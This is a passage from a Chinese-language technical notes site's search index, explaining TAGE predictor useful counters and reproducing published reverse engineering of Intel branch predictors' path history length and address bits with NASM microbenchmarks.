<li>\u200b\u5982\u679c\u200b\u7528\u8be5\u200b\u8868\u9879\u200b\u9884\u6d4b\u200b\u7684\u200b\u6b63\u786e\u200b\uff0c\u200b\u800c\u7528\u200b\u66f4\u200b\u77ed\u200b\u5386\u53f2\u200b\u7684\u200b table \u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8be5\u200b\u8868\u9879\u200b\u5f88\u200b\u6709\u7528\u200b\uff0cuseful \u200b\u589e\u52a0\u200b</li> <li>\u200b\u53cd\u4e4b\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u8be5\u200b\u8868\u9879\u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u800c\u7528\u200b\u66f4\u200b\u77ed\u200b\u5386\u53f2\u200b\u7684\u200b table \u200b\u9884\u6d4b\u200b\u7684\u200b\u6b63\u786e\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8be5\u200b\u8868\u9879\u200b\u6548\u679c\u200b\u4e0d\u597d\u200b\uff0cuseful \u200b\u51cf\u5c11\u200b</li> </ol> <p>\u200b\u51fa\u73b0\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u65f6\u200b\uff0c\u200b\u8ba4\u4e3a\u200b\u5f53\u524d\u200b\u6240\u7528\u200b\u7684\u200b PHT \u200b\u7684\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u592a\u6bb5\u200b\uff0c\u200b\u4e0d\u591f\u200b\u9884\u6d4b\u200b\u5f53\u524d\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u5177\u6709\u200b\u66f4\u957f\u200b\u7684\u200b\u5386\u53f2\u200b\u7684\u200b PHT \u200b\u91cc\u200b\u5206\u914d\u200b\u4e00\u6761\u200b\u7ed9\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u627e\u200b\u4e00\u4e2a\u200b useful \u200b\u7b49\u4e8e\u200b 0 \u200b\u7684\u200b\u9879\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u4e00\u4e9b\u200b\u8868\u9879\u200b\u5f88\u200b\u957f\u65f6\u95f4\u200b\u90fd\u200b\u6ca1\u6709\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b useful \u200b\u6bd4\u8f83\u200b\u5927\u800c\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u66ff\u6362\u200b\uff0c\u200b\u5360\u7528\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u9700\u8981\u200b\u5b9a\u65f6\u200b\u51cf\u5c11\u200b PHT \u200b\u91cc\u200b\u6240\u6709\u200b\u8868\u9879\u200b\u7684\u200b useful \u200b\u8ba1\u6570\u5668\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b useful \u200b\u8ba1\u6570\u5668\u200b\u4e5f\u200b\u6709\u200b\u8ba1\u65f6\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u592a\u4e45\u200b\u6ca1\u7528\u200b\u7684\u200b\u8868\u9879\u200b\u4f1a\u200b\u88ab\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u5728\u200b\u51fa\u73b0\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\uff0c\u200b\u521b\u5efa\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u8868\u9879\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u65b0\u200b\u8868\u9879\u200b\u8bb0\u5f55\u200b\u7684\u200b\u5386\u53f2\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4e0d\u591f\u200b\u51c6\u786e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4e34\u65f6\u200b\u7528\u200b\u7b2c\u4e8c\u200b\u957f\u200b\u7684\u200b\u5339\u914d\u200b\u7684\u200b PHT \u200b\u91cc\u200b\u7684\u200b\u8868\u9879\u200b\u505a\u200b\u9884\u6d4b\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html","title":"CPU \u200b\u5fae\u200b\u67b6\u6784\u200b\u5206\u6790","text":""},{"location":"hardware/cpu_microarchitecture.html#intel","title":"\u590d\u73b0\u200b Intel \u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9006\u5411\u200b\u8bba\u6587","text":""},{"location":"hardware/cpu_microarchitecture.html#_1","title":"\u80cc\u666f","text":"<p>\u200b\u6700\u8fd1\u200b\u770b\u5230\u200b\u4e00\u7cfb\u5217\u200b\u5bf9\u200b Intel \u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u9006\u5411\u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b\u653b\u9632\u200b\u7684\u200b\u8bba\u6587\u200b\uff1a</p> <ul> <li>Half&amp;Half: Demystifying Intel's Directional Branch Predictors for Fast, Secure Partitioned Execution</li> <li>Pathfinder: High-Resolution Control-Flow Attacks Exploiting the Conditional Branch Predictor </li> <li>Indirector: High-Precision Branch Target Injection Attacks Exploiting the Indirect Branch Predictor</li> </ul> <p>\u200b\u56e0\u200b\u5176\u200b\u9006\u5411\u200b\u7684\u200b\u7cbe\u7ec6\u200b\u7a0b\u5ea6\u200b\u800c\u200b\u611f\u5230\u200b\u597d\u5947\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5c1d\u8bd5\u200b\u8fdb\u884c\u200b\u590d\u73b0\u200b\uff0c\u200b\u4e3b\u8981\u200b\u662f\u200b\u9488\u5bf9\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u3002\u200b\u590d\u73b0\u200b\u5e73\u53f0\u200b\u4e3a\u200b Alder Lake \u200b\u67b6\u6784\u200b\u7684\u200b i9-12900KS \u200b\u548c\u200b Skylake \u200b\u67b6\u6784\u200b\u7684\u200b Xeon D-2146NT\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_2","title":"\u590d\u73b0","text":"<p>\u200b\u7531\u4e8e\u200b Pathfinder \u200b\u548c\u200b Indirector \u200b\u8bba\u6587\u200b\u90fd\u200b\u5728\u200b\u7f51\u4e0a\u200b\u516c\u5f00\u200b\u4e86\u200b\u4ee3\u7801\u200b\uff0c\u200b\u5b83\u4eec\u200b\u90fd\u200b\u662f\u200b\u57fa\u4e8e\u200b agner \u200b\u7684\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u6846\u67b6\u200b \u200b\u4fee\u6539\u200b\u800c\u200b\u6765\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6211\u200b\u4e5f\u200b\u662f\u200b\u5728\u200b agner \u200b\u7684\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u6846\u67b6\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u505a\u200b\u7684\u200b\u590d\u73b0\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr","title":"PHR \u200b\u8bb0\u5f55\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570","text":"<p>\u200b\u73b0\u4ee3\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u4f1a\u200b\u8bb0\u5f55\u200b\u5168\u5c40\u200b\u7684\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u4fe1\u606f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bba\u6587\u200b\u91cc\u200b\u7b2c\u4e00\u6b65\u200b\u662f\u200b\u6d4b\u8bd5\u200b\u80fd\u591f\u200b\u8bb0\u5f55\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u5386\u53f2\u200b\u4fe1\u606f\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u6d4b\u8bd5\u200b\u601d\u8def\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <ol> <li>\u200b\u6839\u636e\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u4ee5\u200b 50% \u200b\u7684\u200b\u6982\u7387\u200b\u8ba9\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u8df3\u8f6c\u200b\u6216\u200b\u4e0d\u200b\u8df3\u8f6c\u200b</li> <li>\u200b\u63d2\u5165\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u603b\u662f\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\uff08\u200b\u4e0b\u79f0\u200b dummy branch\uff09</li> <li>\u200b\u6839\u636e\u200b\u7b2c\u4e00\u6b65\u200b\u7684\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u8ba9\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u548c\u200b\u7b2c\u4e00\u4e2a\u200b\u5206\u652f\u200b\u4ee5\u200b\u76f8\u540c\u200b\u65b9\u5411\u200b\u8df3\u8f6c\u200b\u6216\u200b\u4e0d\u200b\u8df3\u8f6c\u200b</li> </ol> <p>\u200b\u5982\u679c\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u8db3\u591f\u200b\u8bb0\u5f55\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u7684\u200b\u6240\u6709\u200b\u5206\u652f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u51c6\u786e\u200b\u5730\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u7684\u200b\u8df3\u8f6c\u200b\u65b9\u5411\u200b\u548c\u200b\u7b2c\u4e00\u6b65\u200b\u76f8\u540c\u200b\uff1b\u200b\u5982\u679c\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u4e0d\u591f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u65f6\u200b\uff0c\u200b\u5386\u53f2\u200b\u91cc\u200b\u6ca1\u6709\u200b\u7b2c\u4e00\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u51c6\u786e\u7387\u200b\u53ea\u4f1a\u200b\u6709\u200b 50%\u3002\u200b\u901a\u8fc7\u200b\u8fd9\u4e2a\u200b\u5dee\u522b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6d4b\u8bd5\u200b\u51fa\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u6709\u200b\u591a\u5c11\u200b\u3002\u200b\u7528\u200b NASM \u200b\u7f16\u5199\u200b\u8fd9\u4e2a\u200b\u6d4b\u8bd5\u200b\uff1a</p> <pre><code>; number of dummy branches\n%ifndef dummybranches\n    %define dummybranches 200\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n    ; read performance counters before loops\n    READ_PMC_START\n\nloop_begin:\n\n    ; train branch\n    rdrand eax\n    and eax, 1\n    jnz first_target\nfirst_target:\n\n    ; dummy branches\n    %assign i 0\n    %rep dummybranches\n    jmp dummy_branch_%+ i\ndummy_branch_%+ i:\n    %assign i i+1\n    %endrep\n\n    ; test branch\n    test eax, eax\n    jnz second_target\nsecond_target:\n\n    dec rdi\n    jnz loop_begin\n\n    ; read performance counters after loops\n    READ_PMC_END\n%endmacro\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53d1\u73b0\u200b dummy branch \u200b\u6570\u91cf\u200b\u5728\u200b 193 \u200b\u53ca\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u63a5\u8fd1\u200b 0%\uff0c\u200b\u800c\u200b\u7b2c\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u5927\u7ea6\u200b 50%\uff0c\u200b\u5e73\u5747\u200b\u4e0b\u6765\u200b\u662f\u200b 25%\uff1b\u200b\u800c\u200b dummy branch \u200b\u6570\u91cf\u200b\u5728\u200b 194 \u200b\u53ca\u200b\u4ee5\u4e0a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u5927\u7ea6\u200b 50%\uff0c\u200b\u548c\u200b\u7b2c\u4e00\u4e2a\u200b\u5206\u652f\u200b\u5e73\u5747\u200b\u4e0b\u6765\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u662f\u200b 25%\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b Intel Alder Lake \u200b\u67b6\u6784\u200b\u4e0b\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u5386\u53f2\u200b\u53ea\u80fd\u200b\u8bb0\u5f55\u200b\u6700\u200b\u591a\u200b 194 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002\u200b\u628a\u200b\u4e2d\u95f4\u200b\u7684\u200b dummy branch \u200b\u7684\u200b\u603b\u662f\u200b\u8df3\u8f6c\u200b\u6539\u6210\u200b\u603b\u662f\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u53d1\u73b0\u200b\u603b\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u4e00\u76f4\u200b\u662f\u200b 25%\uff0c\u200b\u8bf4\u660e\u200b Intel Alder Lake \u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u5386\u53f2\u200b\u4e0d\u200b\u8bb0\u5f55\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u3002\u200b\u800c\u200b Path History Register(PHR) \u200b\u662f\u200b\u7b26\u5408\u200b\u8fd9\u4e2a\u200b\u7279\u6027\u200b\u7684\u200b\u4e00\u79cd\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u731c\u6d4b\u200b Intel \u200b\u91c7\u7528\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u65b9\u6848\u200b\u3002</p> <p>\u200b\u5728\u200b Skylake \u200b\u4e0b\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u5f97\u51fa\u200b Skylake \u200b\u67b6\u6784\u200b\u4e0b\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u5386\u53f2\u200b\u53ea\u80fd\u200b\u8bb0\u5f55\u200b\u6700\u8fd1\u200b 93 \u200b\u4e2a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr_1","title":"PHR \u200b\u91c7\u7528\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4f4d\u6570","text":"<p>PHR \u200b\u5728\u200b\u8bb0\u5f55\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u8bb0\u5f55\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u81ea\u8eab\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5206\u652f\u200b\u8df3\u8f6c\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5f88\u200b\u597d\u200b\u7406\u89e3\u200b\uff0c\u200b\u4f46\u662f\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u81ea\u8eab\u200b\u7684\u200b\u5730\u5740\u200b\u5374\u200b\u4e0d\u597d\u200b\u8bf4\u200b\u662f\u200b\u54ea\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>0x10000 75 00  jnz target\n</code></pre> <p>\u200b\u8fd9\u200b\u6761\u200b jnz \u200b\u6307\u4ee4\u200b\u4ece\u200b 0x10000 \u200b\u5f00\u59cb\u200b\u5360\u7528\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u90a3\u4e48\u200b PHR \u200b\u5728\u200b\u8bb0\u5f55\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u54ea\u4e2a\u200b\u5462\u200b\uff1f\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u731c\u60f3\u200b\uff1a</p> <ol> <li>\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\uff080x10000\uff09</li> <li>\u200b\u4e0b\u200b\u4e00\u200b\u8df3\u200b\u6307\u4ee4\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\uff080x10002\uff09</li> </ol> <p>\u200b\u9605\u8bfb\u200b Pathfinder \u200b\u548c\u200b Indirector \u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u548c\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u901a\u8fc7\u200b\u90ae\u4ef6\u200b\u6c9f\u901a\u200b\u540e\u200b\uff08\u200b\u611f\u8c22\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u7684\u200b\u8be6\u7ec6\u200b\u6307\u5bfc\u200b\uff01\uff09\uff0c\u200b\u53d1\u73b0\u200b\u4ee5\u4e0a\u200b\u4e24\u4e2a\u200b\u731c\u60f3\u200b\u90fd\u200b\u4e0d\u200b\u5bf9\u200b\uff1a\u200b\u5b9e\u9645\u4e0a\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5730\u5740\u200b\uff080x10001\uff09\u3002\u200b\u8003\u8651\u200b\u5230\u200b x86 \u200b\u662f\u200b\u53d8\u957f\u200b\u6307\u4ee4\u96c6\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5408\u7406\u200b\uff1a\u200b\u901a\u8fc7\u200b\u8bb0\u5f55\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u907f\u514d\u200b\u4e86\u200b\u5904\u7406\u200b\u4e0d\u540c\u200b\u957f\u5ea6\u200b\u7684\u200b jnz \u200b\u6307\u4ee4\u200b\u7684\u200b\u60c5\u51b5\u200b\uff08\u200b\u4f8b\u5982\u200b jnz \u200b\u6709\u200b\u643a\u5e26\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b\u7acb\u5373\u200b\u6570\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u6b64\u65f6\u200b jnz + \u200b\u7acb\u5373\u200b\u6570\u200b\u4e00\u5171\u200b\u662f\u200b 6 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u662f\u200b\u7528\u200b\u7684\u200b 6 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u91cc\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5730\u5740\u200b\uff09\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6d4b\u8bd5\u200b PHR \u200b\u91c7\u7528\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u5730\u5740\u200b\u4f4d\u6570\u200b\uff0c\u200b\u529e\u6cd5\u200b\u662f\u200b\uff1a\u200b\u628a\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4f4d\u8bbe\u200b\u6210\u200b 0\uff0c\u200b\u6784\u9020\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\uff0c\u200b\u770b\u770b\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b\u51c6\u786e\u7387\u200b\u5982\u4f55\u200b\uff1a</p> <ol> <li>\u200b\u5faa\u73af\u200b\u82e5\u5e72\u6b21\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e9b\u200b\u6b21\u200b\u5faa\u73af\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u4f4d\u200b\u90fd\u200b\u662f\u200b 0\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u628a\u200b PHR \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u5168\u200b 0</li> <li>\u200b\u628a\u200b\u4e00\u4e2a\u200b\u4f9d\u8d56\u200b\u968f\u673a\u6570\u200b\u7684\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u653e\u7f6e\u200b\u5230\u200b\u7279\u5b9a\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4f4d\u8bbe\u200b\u6210\u200b 0\uff0c\u200b\u4e00\u4e9b\u200b\u4f4d\u8bbe\u200b\u6210\u200b 1</li> <li>\u200b\u518d\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e5f\u200b\u4f9d\u8d56\u200b\u7b2c\u4e8c\u6b65\u200b\u7684\u200b\u968f\u673a\u6570\u200b\u9009\u62e9\u200b\u8df3\u8f6c\u200b\u6216\u200b\u4e0d\u200b\u8df3\u8f6c\u200b</li> </ol> <p>\u200b\u8fd9\u4e48\u200b\u505a\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u5148\u200b\u8ba9\u200b PHR \u200b\u6e05\u96f6\u200b\uff0c\u200b\u518d\u200b\u6267\u884c\u200b\u4e00\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u8df3\u8f6c\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b PHR \u200b\u5c06\u4f1a\u200b\u6839\u636e\u200b\u8fd9\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u8ba1\u7b97\u200b\u51fa\u65b0\u200b\u7684\u200b\u503c\u200b\uff1b\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u6ca1\u6709\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u7531\u4e8e\u200b PHR \u200b\u53ea\u200b\u8bb0\u5f55\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u90a3\u4e48\u200b PHR \u200b\u4e0d\u53d8\u200b\uff0c\u200b\u4f9d\u7136\u200b\u662f\u200b\u96f6\u200b\u3002\u200b\u5728\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPHR \u200b\u7684\u200b\u53d6\u503c\u200b\u5c31\u200b\u5f88\u200b\u91cd\u8981\u200b\u4e86\u200b\uff1a</p> <ol> <li>\u200b\u5047\u5982\u200b\u7b2c\u4e8c\u6b65\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e86\u200b\u975e\u200b\u96f6\u200b\u7684\u200b PHR\uff0c\u200b\u90a3\u4e48\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b PHR \u200b\u7b49\u4e8e\u96f6\u200b\u8fd8\u662f\u200b\u4e0d\u200b\u7b49\u4e8e\u96f6\u200b\u53bb\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u5c31\u200b\u4f1a\u200b\u63a5\u8fd1\u200b 0%</li> <li>\u200b\u5047\u5982\u200b\u7b2c\u4e8c\u6b65\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b PHR \u200b\u4f9d\u7136\u200b\u662f\u200b\u96f6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u5728\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u7b2c\u4e8c\u6b65\u200b\u5f80\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u8fd8\u662f\u200b\u6ca1\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u4e8e\u662f\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u5c31\u200b\u4f1a\u200b\u63a5\u8fd1\u200b 50%</li> </ol> <p>\u200b\u9996\u5148\u200b\u6d4b\u8bd5\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u6700\u200b\u591a\u7528\u200b\u4e86\u200b\u591a\u5c11\u200b\u4f4d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u4ece\u200b\u4f4e\u4f4d\u200b\u5f80\u200b\u9ad8\u4f4d\u200b\u4e0d\u65ad\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u66f4\u5927\u200b\u7684\u200b alignment\uff0cNASM \u200b\u7f16\u5199\u200b\u4ee3\u7801\u200b\u6d4b\u8bd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>; reproduce Figure 3 of Half&amp;Half\n\n; alignment bits of branch instruction address\n%ifndef branchalign\n    %define branchalign 18\n%endif\n\n; alignment bits of branch target address\n%ifndef targetalign\n    %define targetalign 5\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n\n    ; loop 300 times to clear phr\n    ; since we only consider branch misprediction of the last two branches\n    ; we do not have to be accurate here e.g. 93/194\nloop_begin:\n    mov eax, 300\n    align 64\n    jmp dummy_target\n\n    align 1&lt;&lt;19\n    %rep (1&lt;&lt;19)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\ndummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;19\n    ; jnz dummy_target\n    db 0x0f\n    db 0x85\n    dd dummy_target - $ - 4\n\n    READ_PMC_START\n    rdrand eax\n    and eax, 1\n\n    ; READ_PMC_START: 166\n    ; rdrand eax: 3 bytes\n    ; and eax, 1: 3 bytes\n    ; jnz first_target: 6 bytes\n\n    %rep (1&lt;&lt;branchalign)-166-6-6\n        nop\n    %endrep\n\n    ; the last byte of jnz aligned to 1&lt;&lt;branchalign\n    ; jnz first_target\n    db 0x0f\n    db 0x85\n    dd first_target - $ - 4\n\n    %rep (1&lt;&lt;targetalign)-1\n        nop\n    %endrep\n    ; target aligned to 1&lt;&lt;targetalign\nfirst_target:\n\n    align 64\n    jnz second_target\nsecond_target:\n\n    READ_PMC_END\n\n    align 64\n    dec rdi\n    jnz loop_begin\n%endmacro\n</code></pre> <p>\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u5982\u4e0b\u200b\uff0c\u200b\u5f53\u200b\u56fa\u5b9a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5bf9\u9f50\u200b\u5230\u200b 2^6 